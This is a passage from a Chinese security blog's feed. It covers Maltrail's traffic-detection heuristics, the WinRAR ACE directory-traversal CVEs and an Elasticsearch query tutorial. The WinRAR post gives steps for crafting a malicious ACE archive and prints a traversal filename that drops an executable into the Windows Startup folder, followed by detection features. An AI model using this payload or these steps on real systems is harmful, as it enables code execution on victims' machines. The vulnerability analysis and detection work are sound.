class="hljs-string">&quot;&lt;title&gt;&quot;</span>):tcp_data.find(<span class="hljs-string">&quot;&lt;/title&gt;&quot;</span>, index)]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(_ <span class="hljs-keyword">in</span> title.lower() <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;this domain&quot;</span>, <span class="hljs-string">&quot;has been seized&quot;</span>)):<br>          log_event((sec, usec, src_ip, src_port, dst_ip, dst_port, PROTO.TCP, TRAIL.IP, title, <span class="hljs-string">&quot;seized domain (suspicious)&quot;</span>, <span class="hljs-string">&quot;(heuristic)&quot;</span>), packet)     <br></code></pre></td></tr></table></figure><p>4.TCP “Content-Type” 中存在以下特征 - content type (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SUSPICIOUS_CONTENT_TYPES = (<span class="hljs-string">&quot;application/vnd.ms-htmlhelp&quot;</span>, <span class="hljs-string">&quot;application/x-bsh&quot;</span>, <span class="hljs-string">&quot;application/x-chm&quot;</span>, <span class="hljs-string">&quot;application/x-sh&quot;</span>, <span class="hljs-string">&quot;application/x-shellscript&quot;</span>, <span class="hljs-string">&quot;application/hta&quot;</span>, <span class="hljs-string">&quot;text/x-scriptlet&quot;</span>, <span class="hljs-string">&quot;text/x-sh&quot;</span>, <span class="hljs-string">&quot;text/x-shellscript&quot;</span>)<br></code></pre></td></tr></table></figure><p>5.HTTP 流量中存在以下特征 - potential proxy probe (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> config.USE_HEURISTICS <span class="hljs-keyword">and</span> dst_port == <span class="hljs-number">80</span> <span class="hljs-keyword">and</span> path.startswith(<span class="hljs-string">&quot;http://&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> path <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> SUSPICIOUS_PROXY_PROBE_PRE_CONDITION) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> _check_domain_whitelisted(path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">2</span>]):<br>  trail = re.sub(<span class="hljs-string">r&quot;(http://[^/]+/)(.+)&quot;</span>, <span class="hljs-string">r&quot;\g&lt;1&gt;(\g&lt;2&gt;)&quot;</span>, path)<br>  trail = re.sub(<span class="hljs-string">r&quot;(http://)([^/(]+)&quot;</span>, <span class="hljs-keyword">lambda</span> match: <span class="hljs-string">&quot;%s%s&quot;</span> % (match.group(<span class="hljs-number">1</span>), match.group(<span class="hljs-number">2</span>).split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>].rstrip(<span class="hljs-string">&#x27;.&#x27;</span>)), trail)<br><br>SUSPICIOUS_PROXY_PROBE_PRE_CONDITION = (<span class="hljs-string">&quot;probe&quot;</span>, <span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;check&quot;</span>)<br></code></pre></td></tr></table></figure><p>6.HTTP 流量中存在 UA 字段且不在下列白名单中 - user agent (suspicious)</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">WHITELIST_UA_KEYWORDS = (<span class="hljs-string">&quot;AntiVir-NGUpd&quot;</span>, <span class="hljs-string">&quot;TMSPS&quot;</span>, <span class="hljs-string">&quot;AVGSETUP&quot;</span>, <span class="hljs-string">&quot;SDDS&quot;</span>, <span class="hljs-string">&quot;Sophos&quot;</span>, <span class="hljs-string">&quot;Symantec&quot;</span>, <span class="hljs-string">&quot;internal dummy connection&quot;</span>, <span class="hljs-string">&quot;Microsoft-CryptoAPI&quot;</span>)<br></code></pre></td></tr></table></figure><p>7.如果 HTTP 请求不在下列白名单且包含可疑预处理参数 - (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">WHITELIST_HTTP_REQUEST_PATHS = (<span class="hljs-string">&quot;fql&quot;</span>, <span class="hljs-string">&quot;yql&quot;</span>, <span class="hljs-string">&quot;ads&quot;</span>, <span class="hljs-string">&quot;../images/&quot;</span>, <span class="hljs-string">&quot;../themes/&quot;</span>, <span class="hljs-string">&quot;../design/&quot;</span>, <span class="hljs-string">&quot;../scripts/&quot;</span>, <span class="hljs-string">&quot;../assets/&quot;</span>, <span class="hljs-string">&quot;../core/&quot;</span>, <span class="hljs-string">&quot;../js/&quot;</span>, <span class="hljs-string">&quot;/gwx/&quot;</span>)<br><br>SUSPICIOUS_HTTP_REQUEST_PRE_CONDITION = (<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;.ht&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><p>8.如果文件后缀名在可疑列表中且下载路径不在白名单之中并且请求中不包含“=”且文件名长度小于10个字符 - direct %s download (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">SUSPICIOUS_DIRECT_DOWNLOAD_EXTENSIONS = <span class="hljs-built_in">set</span>((<span class="hljs-string">&quot;.apk&quot;</span>, <span class="hljs-string">&quot;.chm&quot;</span>, <span class="hljs-string">&quot;.egg&quot;</span>, <span class="hljs-string">&quot;.exe&quot;</span>, <span class="hljs-string">&quot;.hta&quot;</span>, <span class="hljs-string">&quot;.hwp&quot;</span>, <span class="hljs-string">&quot;.pac&quot;</span>, <span class="hljs-string">&quot;.ps1&quot;</span>, <span class="hljs-string">&quot;.scr&quot;</span>, <span class="hljs-string">&quot;.sct&quot;</span>))<br><br>WHITELIST_DIRECT_DOWNLOAD_KEYWORDS = (<span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;/scripts/&quot;</span>, <span class="hljs-string">&quot;/_vti_bin/&quot;</span>, <span class="hljs-string">&quot;/bin/&quot;</span>, <span class="hljs-string">&quot;/pub/softpaq/&quot;</span>, <span class="hljs-string">&quot;/bios/&quot;</span>, <span class="hljs-string">&quot;/pc-axis/&quot;</span>)<br></code></pre></td></tr></table></figure><p>9.如果文件名在 webshell 列表中 - potential web shell (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">WEB_SHELLS 是一个<span class="hljs-built_in">set</span>()，在程序运行时动态添加<br></code></pre></td></tr></table></figure><p>10.如果文件名符合以下正则表达式 - (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SUSPICIOUS_HTTP_PATH_REGEXES = ((<span class="hljs-string">&quot;non-existent page&quot;</span>, <span class="hljs-string">r&quot;defaultwebpage\.cgi&quot;</span>), (<span class="hljs-string">&quot;potential web scan&quot;</span>, <span class="hljs-string">r&quot;inexistent_file_name\.inexistent|test-for-some-inexistent-file|long_inexistent_path|some-inexistent-website\.acu&quot;</span>))<br></code></pre></td></tr></table></figure><p>11.以下内容全部为 DNS 协议启发式检测，源码注释表示引用自 <a href="http://www.ccs.neu.edu/home/amislove/teaching/cs4700/fall09/handouts/project1-primer.pdf">此文章</a>，但目前已经无法访问。与之相关的判定逻辑较为复杂，难以描述清楚，可以在 sensor.py 中以下面的关键字自行查看：</p><ol><li>potential dns exhaustion (suspicious)</li><li>sinkholed by %s (malware)</li><li>parked site (suspicious)</li><li>excessive no such domain (suspicious)</li><li>consonant threshold no such domain (suspicious)</li><li>entropy threshold no such domain (suspicious)</li></ol><p><strong>参考资料：</strong><br><a href="https://github.com/stamparm/maltrail#real-life-cases">README.md - Real-life cases</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>流量检测</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>Maltrail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WinRAR 目录穿越漏洞（CVE-2018-2025[0-3]）</title>
    <link href="/post/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/"/>
    <url>/post/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Check Point 团队爆出了一个关于 WinRAR 存在 19 年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用 WinRAR 解压该恶意文件时便会触发漏洞。</p><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库 UNACEV2.dll 所造成的，动态链接库的作用是处理 ACE  格式文件。而 WinRAR 解压ACE文件时，由于没有对文件名进行充分过滤，导致存在目录穿越漏洞，允许解压过程将恶意文件写入任意目录，甚至 <strong>写入开机启动项</strong>，导致代码执行。</p><p>由于 UNACEV2.dll 动态链接库还被市面上一些支持 <strong>.ace 格式文件</strong> 的解压缩软件所使用，因此除 WinRAR 之外的众多压缩工具、文件管理工具，可能也会存在相同的代码执行风险。</p><p>WinRAR 代码执行相关的 CVE 编号如下：</p><blockquote><p>CVE-2018-20250, CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</p></blockquote><table><thead><tr><th>漏洞名称</th><th>CVE编号</th><th>描述</th></tr></thead><tbody><tr><td>ACE文件验证逻辑绕过漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250">CVE-2018-20250</a></td><td>In WinRAR versions prior to and including 5.61, There  is path traversal vulnerability when crafting the filename field of the  ACE format (in UNACEV2.dll). When the filename field is manipulated  with specific patterns, the destination (extraction) folder is ignored,  thus treating the filename as an absolute path. 在WinRAR 5.61之前的版本中，创建ACE格式文件的filename时存在路径穿越漏洞（在UNACEV2.dll中）。当使用特定的模式操作filename时，解压时将忽略目标（提取）文件路径，而将文件名视为绝对路径进行提取。</td></tr><tr><td>ACE文件名逻辑验证绕过漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20251">CVE-2018-20251</a></td><td>In WinRAR versions prior to and including 5.61, there  is path traversal vulnerability when crafting the filename field of the  ACE format. The UNACE module (UNACEV2.dll) creates files and folders as  written in the filename field even when WinRAR validator noticed the  traversal attempt and requestd to abort the extraction process. the  operation is cancelled only after the folders and files were created but  prior to them being written, therefore allowing the attacker to create  empty files and folders everywhere in the file system. 在WinRAR 5.61之前的版本中，创建ACE格式文件的filename时存在路径穿越漏洞。UNACEV2.dll按照filename中写入的内容创建文件和文件夹，即使WinRAR校验器注意到目录穿越尝试并请求中止提取过程，只有在创建了文件夹和文件之后（写入内容之前）操作才会被取消，因此允许攻击者在文件系统的任何地方创建空文件和空文件夹。</td></tr><tr><td>ACE/RAR文件越界写入漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20252">CVE-2018-20252</a></td><td>In WinRAR versions prior to and including 5.60, there  is an out-of-bounds write vulnerability during parsing of crafted ACE  and RAR archive formats. Successful exploitation could lead to arbitrary  code execution in the context of the current user. 在WinRAR 5.60之前的版本中，对ACE和RAR格式文件进行解析时，存在越界写入漏洞，成功利用可能导致在当前用户的上下文中执行任意代码。</td></tr><tr><td>LHA/LZH文件越界写入漏洞</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20253">CVE-2018-20253</a></td><td>In WinRAR versions prior to and including 5.60, There  is an out-of-bounds write vulnerability during parsing of a crafted LHA  / LZH archive formats. Successful exploitation could lead to arbitrary  code execution in the context of the current user. 在WinRAR 5.60之前的版本中，对LHA和LZH格式文件时进行解析时，存在越界写入漏洞，成功利用可能导致在当前用户的上下文中执行任意代码。</td></tr></tbody></table><p>参考链接：<a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=WinRAR">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=WinRAR</a></p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><ol><li>发布时间早于 5.70 Beta 1 版本的所有 WinRAR 软件；</li><li>使用 UNACEV2.dll 动态链接库的解压、文件管理类工具软件，如：</li></ol><blockquote><p>Bandizip &lt; = 6.2.0.0<br>好压(2345 压缩) &lt; = 5.9.8.10907<br>360压缩 &lt; = 4.0.0.1170</p></blockquote><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>方式一：使用开源 <a href="https://github.com/WyAtu/CVE-2018-20250">EXP</a> 生成压缩格式为 ace 的恶意 rar 文件。</p><p>方式二：手动创建恶意ace文件（具体见 <a href="https://www.cnblogs.com/fox-yu/p/10495236.html%EF%BC%89">https://www.cnblogs.com/fox-yu/p/10495236.html）</a></p><ol><li>使用 WinACE 创建一个 ace 文件；</li><li>使用 <a href="https://pypi.org/project/acefile/">acefile</a> 查看该文件头部信息；</li><li>使用 WinHex 修改文件解压缩路径；</li><li>同时修改 hdr_size 以及 hdr_crc 以及路径长度；</li><li>再用 acefile 校验修改后的结果；</li><li>解压实现攻击。</li></ol><p><strong>利用测试（方式一）：</strong></p><p>利用开源的 exp 生成恶意 ace 压缩文件 test-exp.rar（其中包含3个文件，如图所示），右键解压到当前文件目录后，发现在本地生成了两个正常的 txt 文件，而在开始菜单的启动项中生成了一个hi.exe的可执行文件，目录穿越成功。</p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572492070587.png"></p><p>文件解压时写入的实际路径如下：</p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572491863075.png"></p><p><strong>漏洞利用条件：</strong></p><p>由于产生漏洞的DLL文件：UNACEV2.DLL，<strong>不能识别相对路径，只能识别绝对路径</strong>。因此攻击者在利用漏洞时需要硬编码写入一个相对于当前目录的一个绝对路径，比如：C:..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\test.exe，并且<strong>攻击不能跨盘符</strong>。</p><p>因此攻击能否成功，需要取决于受害者进行解压文件触发漏洞时是否在系统盘，且在不知道计算机主机名的情况下，只能在主浏览器的默认下载路径下（C:\Users\Administrator\Downloads）或者桌面进行解压，或者多猜几个启动项路径。</p><h2 id="0x03-检测方案"><a href="#0x03-检测方案" class="headerlink" title="0x03 检测方案"></a>0x03 检测方案</h2><ol><li>读取压缩文件的十六进制内容，根据头部特征判断是否为 ACE 格式文件；</li><li>读取压缩文件的十六进制内容，识别其默认解压路径（filename）是否为绝对路径（以 ASCII 字符形式存在，中文会出现乱码）；</li><li>读取压缩文件的十六进制内容，识别其默认解压路径（filename）是否包含有敏感路径；</li><li>读取压缩文件的十六进制内容，识别其中是否包含有可执行文件。</li></ol><h3 id="ACE-文件特征头部"><a href="#ACE-文件特征头部" class="headerlink" title="ACE 文件特征头部"></a>ACE 文件特征头部</h3><p>在 WinHex 中以十六进制查看 ACE 文件头部。</p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572570377743.png" alt="正常ace文件test1.ace"></p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572570416878.png" alt="正常ace文件test2.ace"></p><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572570444750.png" alt="上文构造的恶意ace文件test-exp.rar"></p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> ACE 文件特征头部<br>HEX：<span class="hljs-number">31000000902</span>A2A4143452A2A14140200<br>ASCII：<span class="hljs-number">1</span>    **ACE**    <br></code></pre></td></tr></table></figure><h3 id="ACE-文件中存在的目的路径及文件名"><a href="#ACE-文件中存在的目的路径及文件名" class="headerlink" title="ACE 文件中存在的目的路径及文件名"></a>ACE 文件中存在的目的路径及文件名</h3><p><img src="/img/WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2025%5B0-3%5D%EF%BC%89/1572490956434.png" alt="上文构造的恶意ace文件test-exp.rar"></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">// filename字段值<br>HEX：433A5C433A433A2E2E2F417070446174615C526F616D696E675C4D6963726F736F66745C57696E646F77735C5374617274204D656E755C50726F6772616D735C537461727475705C68692E657865<br>ASCII：<br>C:<span class="hljs-symbol">\C</span>:C:../AppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<span class="hljs-symbol">\h</span>i.exe<br><br>// filename头部起始标志位<br>HEX：0A005445XX00<br></code></pre></td></tr></table></figure><p><strong>检测方式：是否为绝对路径 + 是否为开机自启动路径 + 是否包含可执行文件后缀名。</strong></p><p>一些 Windows 版本的自启动路径如下：</p><blockquote><p>Win2003 开机启动项路径：C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</p><p>Win2008 开机启动项路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p>Win2012 开机启动项路径：C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p>Win7 开机启动项路径：C:\Users\用户\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p>Win8.1 开机启动项路径：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p><p>Win10 开机启动项路径：C:\Users\用户\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p></blockquote><p>除 Win 2003 中文版外共有的启动路径特征：<strong>\Microsoft\Windows\Start Menu\Programs\Startup</strong></p><p><strong>参考文章：</strong><br>漏洞的详细分析：<a href="https://xz.aliyun.com/t/4221">https://xz.aliyun.com/t/4221</a><br>攻击利用方式：<a href="https://www.freebuf.com/column/201214.html">https://www.freebuf.com/column/201214.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>WinRAR</tag>
      
      <tag>CVE</tag>
      
      <tag>目录穿越</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何正确使用 ES 搜索引擎——查询</title>
    <link href="/post/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8ES%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%9F%A5%E8%AF%A2/"/>
    <url>/post/%E5%A6%82%E4%BD%95%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8ES%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<p>Elasticsearch 是一个使用 Java 编写的开源搜索引擎，建立在全文搜索引擎库 <a href="https://lucene.apache.org/core/">Apache Lucene™</a> 基础之上，它的内部使用 Lucene 做索引与搜索，但隐藏了 Lucene 的复杂性，取而代之的是将所有功能打包成一个单独的服务，可以通过程序与它提供的一套简单的 RESTful API 进行通信。</p><h2 id="查询表达式（query）"><a href="#查询表达式（query）" class="headerlink" title="查询表达式（query）"></a>查询表达式（query）</h2><p>查询表达式（Query DSL）是一种非常灵活的查询语言，es 使用它以简单的 json 接口来展现 Lucene 的绝大部分功能，要使用这种查询表达式，只需将查询语句传递给 <code>query</code> 参数：</p><figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>    <span class="hljs-string">&quot;query&quot;</span>: YOUR_QUERY_HERE<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="query-DSL"><a href="#query-DSL" class="headerlink" title="query DSL"></a>query DSL</h3><p>在查询上下文中，查询会回答这个问题——<strong>“这个文档匹不匹配这个查询，它的相关度高吗？”</strong></p><p>如何验证匹配很好理解，如何计算相关度呢？es 中索引的数据都会存储一个 _score 分值，分值越高就代表越匹配。另外关于某个搜索的分值计算还是很复杂的，因此也需要一定的时间。</p><h3 id="filter-DSL"><a href="#filter-DSL" class="headerlink" title="filter DSL"></a>filter DSL</h3><p>在过滤器上下文中，查询会回答这个问题——<strong>“这个文档匹不匹配？”</strong></p><p>答案很简单，是或者不是。它不会去计算任何分值，也不会关心返回的排序问题，因此效率会高一点。另外，经常使用过滤器，es 会自动的缓存过滤器的内容，会提高很多查询的性能。</p><h2 id="查询请求结果"><a href="#查询请求结果" class="headerlink" title="查询请求结果"></a>查询请求结果</h2><h3 id="hits"><a href="#hits" class="headerlink" title="hits"></a>hits</h3><p>返回结果中最重要的部分是 <code>hits</code> ，它包含 <code>total</code> 字段来表示匹配到的文档总数，并且一个 <code>hits</code> 数组包含所查询结果的前十个文档。在 <code>hits</code> 数组中每个结果包含文档的 <code>_index</code> 、 <code>_type</code> 、 <code>_id</code> ，加上 <code>_source</code> 字段，这意味着我们可以直接从返回的搜索结果中使用整个文档，而不像其他的搜索引擎，仅仅返回文档的 ID。每个结果还有一个 <code>_score</code> ，它衡量了文档与查询的匹配程度，<code>max_score</code> 表示与查询所匹配文档的 <code>_score</code> 的最大值。</p><h3 id="took"><a href="#took" class="headerlink" title="took"></a>took</h3><p><code>took</code> 值告诉我们执行整个搜索请求耗费了多少 <strong>毫秒</strong>。</p><h3 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h3><p><code>timed_out</code> 值告诉我们查询是否超时。默认情况下，搜索请求不会超时。如果低响应时间比完成结果更重要，你可以指定 <code>timeout</code> 为 10ms 或者 1s。在请求超时之前，es 将会返回已经成功从每个分片获取的结果。</p><h3 id="shards"><a href="#shards" class="headerlink" title="shards"></a>shards</h3><p><code>_shards</code> 部分告诉我们在查询中参与分片的总数，以及这些分片成功了多少个失败了多少个。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 这是查询返回的结果</span><br>&#123;<br>   <span class="hljs-string">&quot;took&quot;</span>: <span class="hljs-number">2</span>,  <span class="hljs-comment">// 执行整个搜索请求耗费了多少毫秒</span><br>   <span class="hljs-string">&quot;timed_out&quot;</span>: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// 查询是否超时</span><br>   <span class="hljs-string">&quot;_shards&quot;</span>: &#123;  <span class="hljs-comment">// 查询中参与分片的总数，以及这些分片成功了多少个失败了多少个</span><br>      <span class="hljs-string">&quot;total&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-string">&quot;successful&quot;</span>: <span class="hljs-number">5</span>,<br>      <span class="hljs-string">&quot;skipped&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-string">&quot;failed&quot;</span>: <span class="hljs-number">0</span><br>   &#125;,<br>   <span class="hljs-string">&quot;hits&quot;</span>: &#123;  <span class="hljs-comment">// 所有查询到的结果</span><br>      <span class="hljs-string">&quot;total&quot;</span>: <span class="hljs-number">1008</span>,  <span class="hljs-comment">// 表示匹配到的文档总数</span><br>      <span class="hljs-string">&quot;max_score&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 结果中最大的评分</span><br>      <span class="hljs-string">&quot;hits&quot;</span>: [<br>         &#123;<br>            <span class="hljs-string">&quot;_index&quot;</span>: <span class="hljs-string">&quot;bank&quot;</span>,  <span class="hljs-comment">// 索引名称</span><br>            <span class="hljs-string">&quot;_type&quot;</span>: <span class="hljs-string">&quot;account&quot;</span>,  <span class="hljs-comment">// type 名称</span><br>            <span class="hljs-string">&quot;_id&quot;</span>: <span class="hljs-string">&quot;25&quot;</span>,  <span class="hljs-comment">// id 名称</span><br>            <span class="hljs-string">&quot;_score&quot;</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 评分</span><br>            <span class="hljs-string">&quot;_source&quot;</span>: &#123;  <span class="hljs-comment">// 存储的数据源信息</span><br>               <span class="hljs-string">&quot;account_number&quot;</span>: <span class="hljs-number">25</span>,<br>               <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">40540</span>,<br>               <span class="hljs-string">&quot;firstname&quot;</span>: <span class="hljs-string">&quot;Virginia&quot;</span>,<br>               <span class="hljs-string">&quot;lastname&quot;</span>: <span class="hljs-string">&quot;Ayala&quot;</span>,<br>               <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">39</span>,<br>               <span class="hljs-string">&quot;gender&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>,<br>               <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;171 Putnam Avenue&quot;</span>,<br>               <span class="hljs-string">&quot;employer&quot;</span>: <span class="hljs-string">&quot;Filodyne&quot;</span>,<br>               <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;virginiaayala@filodyne.com&quot;</span>,<br>               <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;Nicholson&quot;</span>,<br>               <span class="hljs-string">&quot;state&quot;</span>: <span class="hljs-string">&quot;PA&quot;</span><br>            &#125;<br>         &#125;<br>      ]<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="多索引，多类型"><a href="#多索引，多类型" class="headerlink" title="多索引，多类型"></a>多索引，多类型</h2><ul><li><p><code>/_search</code> </p><p>在所有的索引中搜索所有的类型 </p></li><li><p><code>/gb/_search</code> </p><p>在 <code>gb</code> 索引中搜索所有的类型 </p></li><li><p><code>/gb,us/_search</code> </p><p>在 <code>gb</code> 和 <code>us</code> 索引中搜索所有的文档 </p></li><li><p><code>/g*,u*/_search</code> </p><p>在任何以 <code>g</code> 或者 <code>u</code> 开头的索引中搜索所有的类型 </p></li><li><p><code>/gb/user/_search</code> </p><p>在 <code>gb</code> 索引中搜索 <code>user</code> 类型 </p></li><li><p><code>/gb,us/user,tweet/_search</code> </p><p>在 <code>gb</code> 和 <code>us</code> 索引中搜索 <code>user</code> 和 <code>tweet</code> 类型 </p></li><li><p><code>/_all/user,tweet/_search</code> </p><p>在所有的索引中搜索 <code>user</code> 和 <code>tweet</code> 类型 </p></li></ul><h2 id="分页（from、size）"><a href="#分页（from、size）" class="headerlink" title="分页（from、size）"></a>分页（from、size）</h2><ul><li><p><code>from</code></p><p>​    显示应该跳过的初始结果数量，默认是 <code>0</code> </p></li><li><p><code>size</code></p><p>​    显示应该返回的结果数量，默认是 <code>10</code> </p></li></ul><p>可以同时使用 <code>from</code> 和 <code>size</code> 参数来分页：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">GET /_search<br>&#123;<br>  <span class="hljs-string">&quot;from&quot;</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">10</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="精确值查找（term，terms）"><a 